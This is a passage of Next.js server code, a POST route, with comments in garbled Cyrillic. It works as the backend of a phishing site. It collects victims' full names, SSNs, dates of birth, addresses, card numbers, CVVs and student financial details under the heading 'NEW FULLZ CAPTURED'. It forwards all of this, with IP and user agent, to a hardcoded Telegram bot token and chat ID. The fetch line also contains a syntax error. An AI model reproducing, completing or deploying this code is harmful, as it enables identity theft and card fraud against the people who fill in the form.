 NextResponse } from 'next/server';

// –¢–≤–æ–π Telegram –±–æ—Ç —Ç–æ–∫–µ–Ω –∏ chat ID
const TELEGRAM_BOT_TOKEN = '8390637140:AAGsArp5iMbDGPVx5xVGiA2DbF7rszHU45Q';
const TELEGRAM_CHAT_ID = '5425350181';

export async function POST(request: Request) {
  try {
    const data = await request.json();

    // –§–æ—Ä–º–∞—Ç–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Telegram
    const message = `
üé£ *NEW FULLZ CAPTURED* üé£

üë§ *Personal Information:*
‚Ä¢ Name: ${data.fullName}
‚Ä¢ Email: ${data.email}
‚Ä¢ Phone: ${data.phone}
‚Ä¢ DOB: ${data.dateOfBirth}
‚Ä¢ SSN: ||${data.ssn}||
‚Ä¢ Address: ${data.address}, ${data.city}, ${data.state} ${data.zipCode}

üéì *Education:*
‚Ä¢ University: ${data.university}
‚Ä¢ Field: ${data.fieldOfStudy}
‚Ä¢ Year: ${data.academicYear}
‚Ä¢ GPA: ${data.gpaRange}

üí∞ *Financial Info:*
‚Ä¢ Housing: ${data.housingStatus}
‚Ä¢ Income: ${data.familyIncome}
‚Ä¢ Loans: ${data.studentLoans}
‚Ä¢ Dependents: ${data.dependents}

üí≥ *Banking Info:*
‚Ä¢ Bank: ${data.bankName}
‚Ä¢ Card: ||${data.cardNumber}||
‚Ä¢ Exp: ${data.expDate}
‚Ä¢ CVV: ||${data.cvv}||
‚Ä¢ Cardholder: ${data.cardholderName}

üìù *Additional Info:*
‚Ä¢ Career Goals: ${data.careerGoals}
‚Ä¢ Contact Method: ${data.contactMethod}
‚Ä¢ Special Circumstances: ${data.specialCircumstances || 'None'}

üåê *Technical Info:*
‚Ä¢ IP: ${request.headers.get('x-forwarded-for') || 'Unknown'}
‚Ä¢ Time: ${new Date().toISOString()}
‚Ä¢ User Agent: ${request.headers.get('user-agent')}
    `;

    // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≤ Telegram
    const telegramResponse = await fetch(`https://api.telegram.org/bot${8390637140:AAGsArp5iMbDGPVx5xVGiA2DbF7rszHU45Q}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      }),
    });

    if (!telegramResponse.ok) {
      console.error('Telegram API error:', await telegramResponse.text());
    }

    // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ —Ñ–∞–π–ª (–¥–ª—è –±—ç–∫–∞–ø–∞)
    const logData = `
=== NEW SUBMISSION ${new Date().toISOString()} ===
${JSON.stringify(data, null, 2)}
=== END SUBMISSION ===

    `;

    // –ó–¥–µ—Å—å –º–æ–∂–Ω–æ –¥–æ–±–∞–≤–∏—Ç—å —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –≤ —Ñ–∞–π–ª –∏–ª–∏ –±–∞–∑—É –¥–∞–Ω–Ω—ã—Ö

    return NextResponse.json({ success: true });

  } catch (error) {
    console.error('Error processing submission:', error);
    return NextResponse.json(
      { error: 'Internal server error' },
      { status: 500 }
    );
  }
}
